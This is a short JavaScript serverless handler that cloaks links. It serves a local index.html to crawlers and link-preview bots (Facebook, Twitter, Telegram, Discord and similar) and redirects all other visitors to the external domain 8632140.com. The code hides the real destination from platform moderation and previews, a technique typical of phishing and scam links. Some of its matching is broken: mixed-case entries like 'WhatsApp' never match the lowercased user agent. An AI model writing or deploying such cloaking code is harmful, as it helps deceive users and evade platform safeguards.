export default function handler(req, res) {
  const ua = req.headers['user-agent'] || '';

  const bots = ['facebook', 'twitter', 'telegram', 'discord', 'WhatsApp', 'Slack', 'bot', 'crawler', 'spider'];

  const isBot = bots.some(bot => ua.toLowerCase().includes(bot));

  if (isBot) {
    res.setHeader('Content-Type', 'text/html');
    res.status(200).sendFile('index.html', { root: 'public' });
  } else {
    res.writeHead(302, { Location: 'https://8632140.com/' });
    res.end();
  }
}
